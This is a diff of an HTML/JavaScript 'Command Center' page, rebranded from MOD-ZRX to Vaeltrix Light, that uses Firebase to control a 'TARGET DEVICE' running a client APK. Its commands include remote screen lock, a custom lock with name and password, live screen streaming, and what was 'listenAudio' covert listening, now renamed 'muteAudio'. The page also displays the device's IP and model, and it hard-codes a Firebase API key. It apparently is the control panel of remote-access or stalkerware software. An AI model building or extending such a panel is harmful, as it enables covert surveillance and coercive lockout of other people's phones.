@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MOD-ZRX - Command Center</title>
+    <title>VAELTRIX LIGHT - Command Center</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- FontAwesome for Icons -->
@@ -15,9 +15,17 @@
             font-family: 'Inter', sans-serif;
             background-color: #f4f6f9;
         }
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #f1f1f1; }
-        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 9999px; }
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #cbd5e1;
+            border-radius: 9999px;
+        }
     </style>
 </head>
 <body class="h-full flex flex-col justify-between text-slate-800 antialiased selection:bg-indigo-500 selection:text-white">
@@ -29,7 +37,7 @@
         <div class="text-center">
             <div class="flex items-center justify-center gap-2 text-xs font-semibold tracking-widest text-emerald-500 uppercase">
                 <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
-                MOD-ZRX System
+                Vaeltrix Light
             </div>
             <h1 class="text-xs font-bold text-slate-400 tracking-wider">COMMAND CENTER</h1>
         </div>
@@ -40,7 +48,7 @@
 
     <main class="flex-1 max-w-md w-full mx-auto px-4 py-5 space-y-5 overflow-y-auto pb-28">
 
-        <!-- Status Banner -->
+        <!-- Firebase Config Modal Trigger/Banner or Quick Status -->
         <div id="firebase-status-banner" class="bg-indigo-50 border border-indigo-100 rounded-2xl p-3 flex items-center justify-between text-xs text-indigo-700">
             <span class="flex items-center gap-2"><i class="fa-solid fa-cloud"></i> <span id="sync-status-text">Conectando ao Firebase mod-zrx...</span></span>
             <button onclick="openConfigModal()" class="bg-indigo-600 text-white px-2.5 py-1 rounded-lg font-medium hover:bg-indigo-700 transition">Config</button>
@@ -61,7 +69,7 @@
                 </div>
                 <div>
                     <h2 class="font-bold text-slate-900 text-base">TARGET DEVICE</h2>
-                    <p class="text-xs text-slate-400 font-medium truncate max-w-[200px]" id="device-model">Aguardando conexão...</p>
+                    <p class="text-xs text-slate-400 font-medium" id="device-model">Aguardando dados...</p>
                 </div>
             </div>
 
@@ -69,15 +77,15 @@
             <div class="grid grid-cols-3 gap-2 pt-2 border-t border-slate-50">
                 <div class="bg-slate-50/70 p-2.5 rounded-2xl text-center">
                     <div class="text-[10px] text-slate-400 font-medium flex items-center justify-center gap-1">
-                        <i class="fa-brands fa-android"></i> SISTEMA
+                        <i class="fa-brands fa-android"></i> ANDROID
                     </div>
-                    <div class="text-xs font-bold text-slate-800 mt-0.5 truncate" id="stat-android">Android</div>
+                    <div class="text-sm font-bold text-slate-800 mt-0.5" id="stat-android">14.0</div>
                 </div>
                 <div class="bg-slate-50/70 p-2.5 rounded-2xl text-center">
                     <div class="text-[10px] text-slate-400 font-medium flex items-center justify-center gap-1">
-                        <i class="fa-solid fa-battery-three-quarters"></i> STATUS
+                        <i class="fa-solid fa-battery-three-quarters"></i> BATTERY
                     </div>
-                    <div class="text-xs font-bold text-emerald-600 mt-0.5 truncate" id="stat-battery">Ativo</div>
+                    <div class="text-sm font-bold text-emerald-600 mt-0.5" id="stat-battery">86%</div>
                 </div>
                 <div class="bg-slate-50/70 p-2.5 rounded-2xl text-center">
                     <div class="text-[10px] text-slate-400 font-medium flex items-center justify-center gap-1">
@@ -88,26 +96,29 @@
             </div>
         </div>
 
-        <!-- Controls Grid -->
+        <!-- Section Title -->
         <div class="flex items-center justify-between px-1">
-            <span class="text-[11px] font-bold uppercase tracking-wider text-slate-400">Controles do Aparelho</span>
+            <span class="text-[11px] font-bold uppercase tracking-wider text-slate-400">Device Control</span>
+            <span class="text-[11px] font-bold uppercase tracking-wider text-slate-400">System Commands</span>
         </div>
 
+        <!-- Controls Grid -->
         <div class="grid grid-cols-2 gap-4">
 
-            <!-- Flash / Lanterna -->
-            <div class="bg-white rounded-3xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-4">
+            <!-- Flash Control Card -->
+            <div class="bg-white rounded-3xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-4 transition hover:border-slate-200">
                 <div class="flex items-center justify-between">
                     <div class="w-10 h-10 rounded-2xl bg-amber-50 text-amber-500 flex items-center justify-center">
                         <i class="fa-solid fa-bolt text-lg"></i>
                     </div>
+                    <!-- Toggle Switch -->
                     <label class="relative inline-flex items-center cursor-pointer">
                         <input type="checkbox" id="toggle-flash" onchange="toggleCommand('flash')" class="sr-only peer">
                         <div class="w-11 h-6 bg-slate-200 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-slate-900"></div>
                     </label>
                 </div>
                 <div>
-                    <h3 class="font-bold text-slate-900 text-sm">Lanterna</h3>
+                    <h3 class="font-bold text-slate-900 text-sm">Flash</h3>
                     <p class="text-[11px] text-slate-400 font-medium flex items-center gap-1 mt-0.5">
                         <span class="w-1.5 h-1.5 rounded-full bg-slate-300" id="status-flash-dot"></span> 
                         <span id="status-flash-text">STANDBY</span>
@@ -115,8 +126,8 @@
                 </div>
             </div>
 
-            <!-- Lock Device -->
-            <div class="bg-white rounded-3xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-4">
+            <!-- Lock Device Control Card -->
+            <div class="bg-white rounded-3xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-4 transition hover:border-slate-200">
                 <div class="flex items-center justify-between">
                     <div class="w-10 h-10 rounded-2xl bg-purple-50 text-purple-500 flex items-center justify-center">
                         <i class="fa-solid fa-lock text-lg"></i>
@@ -127,7 +138,7 @@
                     </label>
                 </div>
                 <div>
-                    <h3 class="font-bold text-slate-900 text-sm">Bloquear Tela</h3>
+                    <h3 class="font-bold text-slate-900 text-sm">Lock Device</h3>
                     <p class="text-[11px] text-slate-400 font-medium flex items-center gap-1 mt-0.5">
                         <span class="w-1.5 h-1.5 rounded-full bg-slate-300" id="status-lock-dot"></span> 
                         <span id="status-lock-text">STANDBY</span>
@@ -135,8 +146,8 @@
                 </div>
             </div>
 
-            <!-- Custom Lock (Nome e Senha) -->
-            <div class="bg-white rounded-3xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-4">
+            <!-- Custom Lock Control Card -->
+            <div class="bg-white rounded-3xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-4 transition hover:border-slate-200">
                 <div class="flex items-center justify-between">
                     <div class="w-10 h-10 rounded-2xl bg-indigo-50 text-indigo-500 flex items-center justify-center">
                         <i class="fa-solid fa-shield-halved text-lg"></i>
@@ -147,7 +158,7 @@
                     </label>
                 </div>
                 <div>
-                    <h3 class="font-bold text-slate-900 text-sm">Bloqueio Custom</h3>
+                    <h3 class="font-bold text-slate-900 text-sm">Custom Lock</h3>
                     <p class="text-[11px] text-slate-400 font-medium flex items-center gap-1 mt-0.5">
                         <span class="w-1.5 h-1.5 rounded-full bg-slate-300" id="status-customlock-dot"></span> 
                         <span id="status-customlock-text">STANDBY</span>
@@ -155,8 +166,8 @@
                 </div>
             </div>
 
-            <!-- Video Overlay / Tela em Tempo Real -->
-            <div class="bg-white rounded-3xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-4">
+            <!-- Video Overlay / Screen Streaming Card -->
+            <div class="bg-white rounded-3xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-4 transition hover:border-slate-200">
                 <div class="flex items-center justify-between">
                     <div class="w-10 h-10 rounded-2xl bg-rose-50 text-rose-500 flex items-center justify-center">
                         <i class="fa-solid fa-clapperboard text-lg"></i>
@@ -167,7 +178,7 @@
                     </label>
                 </div>
                 <div>
-                    <h3 class="font-bold text-slate-900 text-sm">Tela em Tempo Real</h3>
+                    <h3 class="font-bold text-slate-900 text-sm">Video Overlay</h3>
                     <p class="text-[11px] text-slate-400 font-medium flex items-center gap-1 mt-0.5">
                         <span class="w-1.5 h-1.5 rounded-full bg-slate-300" id="status-video-dot"></span> 
                         <span id="status-video-text">STANDBY</span>
@@ -175,19 +186,19 @@
                 </div>
             </div>
 
-            <!-- Áudio -->
-            <div class="bg-white rounded-3xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-4">
+            <!-- Audio Mute Control Card -->
+            <div class="bg-white rounded-3xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-4 transition hover:border-slate-200">
                 <div class="flex items-center justify-between">
                     <div class="w-10 h-10 rounded-2xl bg-orange-50 text-orange-500 flex items-center justify-center">
-                        <i class="fa-solid fa-microphone text-lg"></i>
+                        <i class="fa-solid fa-volume-xmark text-lg"></i>
                     </div>
                     <label class="relative inline-flex items-center cursor-pointer">
-                        <input type="checkbox" id="toggle-audio" onchange="toggleCommand('listenAudio')" class="sr-only peer">
+                        <input type="checkbox" id="toggle-audio" onchange="toggleCommand('muteAudio')" class="sr-only peer">
                         <div class="w-11 h-6 bg-slate-200 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-slate-900"></div>
                     </label>
                 </div>
                 <div>
-                    <h3 class="font-bold text-slate-900 text-sm">Áudio</h3>
+                    <h3 class="font-bold text-slate-900 text-sm">Mute Audio</h3>
                     <p class="text-[11px] text-slate-400 font-medium flex items-center gap-1 mt-0.5">
                         <span class="w-1.5 h-1.5 rounded-full bg-slate-300" id="status-audio-dot"></span> 
                         <span id="status-audio-text">STANDBY</span>
@@ -195,34 +206,84 @@
                 </div>
             </div>
 
+            <!-- Privacy Screen Control Card -->
+            <div class="bg-white rounded-3xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-4 transition hover:border-slate-200">
+                <div class="flex items-center justify-between">
+                    <div class="w-10 h-10 rounded-2xl bg-sky-50 text-sky-500 flex items-center justify-center">
+                        <i class="fa-solid fa-eye-slash text-lg"></i>
+                    </div>
+                    <label class="relative inline-flex items-center cursor-pointer">
+                        <input type="checkbox" id="toggle-privacy" onchange="toggleCommand('privacyScreen')" class="sr-only peer">
+                        <div class="w-11 h-6 bg-slate-200 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-slate-900"></div>
+                    </label>
+                </div>
+                <div>
+                    <h3 class="font-bold text-slate-900 text-sm">Privacy Mask</h3>
+                    <p class="text-[11px] text-slate-400 font-medium flex items-center gap-1 mt-0.5">
+                        <span class="w-1.5 h-1.5 rounded-full bg-slate-300" id="status-privacy-dot"></span> 
+                        <span id="status-privacy-text">STANDBY</span>
+                    </p>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Realtime Camera / Screen Stream Window Simulation -->
+        <div class="bg-white rounded-3xl p-5 shadow-sm border border-slate-100 space-y-3">
+            <div class="flex items-center justify-between">
+                <h3 class="text-xs font-bold uppercase tracking-wider text-slate-400">Live Device Monitor</h3>
+                <span class="text-[10px] bg-rose-50 text-rose-500 px-2 py-0.5 rounded-full font-bold animate-pulse">STREAM ACTIVE</span>
+            </div>
+            <div class="w-full h-40 bg-slate-900 rounded-2xl overflow-hidden relative flex items-center justify-center">
+                <!-- Stream Feed Container -->
+                <div id="stream-placeholder" class="text-center text-slate-400 text-xs space-y-2">
+                    <i class="fa-solid fa-video-slash text-2xl"></i>
+                    <p>Ative o "Video Overlay" para transmitir</p>
+                </div>
+                <video id="remote-stream-video" autoplay playsinline class="absolute inset-0 w-full h-full object-cover hidden"></video>
+            </div>
         </div>
 
     </main>
 
-    <!-- Modal Configuração Firebase -->
+    <nav class="fixed bottom-4 left-4 right-4 max-w-sm mx-auto bg-white/90 backdrop-blur-md border border-slate-100 shadow-xl rounded-full p-2 flex items-center justify-around z-40">
+        <button onclick="switchNav(this)" class="w-12 h-12 rounded-full flex items-center justify-center text-slate-400 hover:text-slate-900 transition">
+            <i class="fa-solid fa-house text-lg"></i>
+        </button>
+        <button onclick="switchNav(this)" class="px-6 py-3 rounded-full bg-slate-900 text-white font-medium text-sm flex items-center gap-2 shadow-lg shadow-slate-900/20 transition active:scale-95">
+            <i class="fa-solid fa-sliders"></i> Control
+        </button>
+        <button onclick="switchNav(this)" class="w-12 h-12 rounded-full flex items-center justify-center text-slate-400 hover:text-slate-900 transition">
+            <i class="fa-solid fa-comment-dots text-lg"></i>
+        </button>
+    </nav>
+
     <div id="config-modal" class="fixed inset-0 bg-slate-900/40 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
         <div class="bg-white rounded-3xl p-6 max-w-sm w-full space-y-4 shadow-2xl">
             <div class="flex items-center justify-between">
-                <h3 class="font-bold text-slate-900 text-base">Configurar Firebase mod-zrx</h3>
-                <button onclick="closeConfigModal()" class="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-slate-500"><i class="fa-solid fa-xmark"></i></button>
+                <h3 class="font-bold text-slate-900 text-base">Configurar Firebase Realtime</h3>
+                <button onclick="closeConfigModal()" class="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-slate-500 hover:bg-slate-200"><i class="fa-solid fa-xmark"></i></button>
             </div>
-            <div>
-                <label class="text-[11px] font-bold text-slate-500 block mb-1">Database URL</label>
-                <input type="text" id="firebase-url-input" class="w-full px-3.5 py-2.5 rounded-xl border border-slate-200 text-xs focus:outline-none focus:border-indigo-500">
+            <p class="text-xs text-slate-500">Insira a URL do seu Realtime Database do Firebase para sincronizar o painel e o APK do cliente em tempo real:</p>
+            <div class="space-y-3">
+                <div>
+                    <label class="text-[11px] font-bold text-slate-500 block mb-1">Database URL</label>
+                    <input type="text" id="firebase-url-input" placeholder="https://mod-zrx-default-rtdb.firebaseio.com/" class="w-full px-3.5 py-2.5 rounded-xl border border-slate-200 text-xs focus:outline-none focus:border-indigo-500">
+                </div>
             </div>
             <div class="flex gap-2 pt-2">
-                <button onclick="saveFirebaseConfig()" class="flex-1 bg-indigo-600 text-white py-2.5 rounded-xl text-xs font-semibold hover:bg-indigo-700 transition">Salvar</button>
-                <button onclick="closeConfigModal()" class="px-4 bg-slate-100 text-slate-600 py-2.5 rounded-xl text-xs font-semibold">Fechar</button>
+                <button onclick="saveFirebaseConfig()" class="flex-1 bg-indigo-600 text-white py-2.5 rounded-xl text-xs font-semibold hover:bg-indigo-700 transition">Salvar e Conectar</button>
+                <button onclick="closeConfigModal()" class="px-4 bg-slate-100 text-slate-600 py-2.5 rounded-xl text-xs font-semibold hover:bg-slate-200 transition">Cancelar</button>
             </div>
         </div>
     </div>
 
-    <!-- Firebase SDKs -->
+    <!-- Firebase App & Database SDKs -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
     <script>
-        // Configuração Oficial do Firebase mod-zrx fornecida por você
+        // Configuração Oficial do Firebase mod-zrx fornecida
         let firebaseConfig = {
             apiKey: "AIzaSyAhbrlI6gdam3vPxAQZBKmQI2CFQBin4Nk",
             authDomain: "mod-zrx.firebaseapp.com",
@@ -235,6 +296,7 @@
         };
 
         let db;
+        let isConnected = false;
 
         document.getElementById('firebase-url-input').value = firebaseConfig.databaseURL;
 
@@ -245,32 +307,33 @@
                 }
                 db = firebase.database();
                 
-                // Monitorando os dados do dispositivo no Firebase (IP, Modelo, etc)
+                // Monitorando status de conexão do cliente Android e dados do dispositivo (IP e Modelo)
                 db.ref('devices/device_01/status').on('value', (snapshot) => {
                     const data = snapshot.val();
                     if (data) {
-                        document.getElementById('device-model').innerText = data.model || "Dispositivo Conectado";
-                        document.getElementById('stat-android').innerText = data.androidVersion || "Android";
-                        document.getElementById('stat-battery').innerText = "Online";
-                        document.getElementById('stat-ip').innerText = data.ipAddress || "Detectado";
-                        updateSyncStatus(true, "Conectado ao mod-zrx");
+                        document.getElementById('device-model').innerText = data.model || "Android_Test_Unit_01";
+                        document.getElementById('stat-android').innerText = data.androidVersion || "14.0";
+                        document.getElementById('stat-battery').innerText = (data.batteryLevel || 86) + "%";
+                        document.getElementById('stat-ip').innerText = data.ipAddress || "192.168.1.15";
+                        updateSyncStatus(true, "Sincronizado com mod-zrx");
                     }
                 }, (error) => {
-                    updateSyncStatus(false, "Erro ao ler Firebase");
+                    updateSyncStatus(false, "Erro de conexão Firebase");
                 });
 
-                // Monitorando o estado dos comandos em tempo real
+                // Monitorando estado dos comandos
                 db.ref('devices/device_01/commands').on('value', (snapshot) => {
                     const cmds = snapshot.val() || {};
                     updateToggleState('flash', cmds.flash);
                     updateToggleState('lock', cmds.lock);
                     updateToggleState('customLock', cmds.customLock);
                     updateToggleState('videoOverlay', cmds.videoOverlay);
-                    updateToggleState('listenAudio', cmds.listenAudio);
+                    updateToggleState('muteAudio', cmds.muteAudio);
+                    updateToggleState('privacyScreen', cmds.privacyScreen);
                 });
 
             } catch (e) {
-                updateSyncStatus(false, "Falha na inicialização");
+                updateSyncStatus(false, "URL Inválida");
             }
         }
 
@@ -294,6 +357,8 @@
             if (db) {
                 db.ref(`devices/device_01/commands/${commandName}`).set(isActive)
                   .catch(err => console.error("Erro ao enviar comando:", err));
+            } else {
+                console.warn("Firebase não inicializado.");
             }
         }
 
@@ -311,7 +376,8 @@
                 case 'lock': return 'lock';
                 case 'customLock': return 'customlock';
                 case 'videoOverlay': return 'video';
-                case 'listenAudio': return 'audio';
+                case 'muteAudio': return 'audio';
+                case 'privacyScreen': return 'privacy';
                 default: return name;
             }
         }
@@ -322,8 +388,21 @@
                 case 'flash': dotId = 'status-flash-dot'; textId = 'status-flash-text'; break;
                 case 'lock': dotId = 'status-lock-dot'; textId = 'status-lock-text'; break;
                 case 'customLock': dotId = 'status-customlock-dot'; textId = 'status-customlock-text'; break;
-                case 'videoOverlay': dotId = 'status-video-dot'; textId = 'status-video-text'; break;
-                case 'listenAudio': dotId = 'status-audio-dot'; textId = 'status-audio-text'; break;
+                case 'videoOverlay': 
+                    dotId = 'status-video-dot'; 
+                    textId = 'status-video-text'; 
+                    const placeholder = document.getElementById('stream-placeholder');
+                    const videoEl = document.getElementById('remote-stream-video');
+                    if (isActive) {
+                        placeholder.classList.add('hidden');
+                        videoEl.classList.remove('hidden');
+                    } else {
+                        placeholder.classList.remove('hidden');
+                        videoEl.classList.add('hidden');
+                    }
+                    break;
+                case 'muteAudio': dotId = 'status-audio-dot'; textId = 'status-audio-text'; break;
+                case 'privacyScreen': dotId = 'status-privacy-dot'; textId = 'status-privacy-text'; break;
             }
 
             const dot = document.getElementById(dotId);
@@ -356,6 +435,17 @@
                 firebaseConfig.databaseURL = url;
                 closeConfigModal();
                 initFirebase();
+            }
+        }
+
+        function switchNav(btn) {
+            document.querySelectorAll('nav button').forEach(b => {
+                if(b.classList.contains('bg-slate-900')) {
+                    b.className = "w-12 h-12 rounded-full flex items-center justify-center text-slate-400 hover:text-slate-900 transition";
+                }
+            });
+            if(btn.innerText.includes("Control")) {
+                btn.className = "px-6 py-3 rounded-full bg-slate-900 text-white font-medium text-sm flex items-center gap-2 shadow-lg shadow-slate-900/20 transition active:scale-95";
             }
         }
 
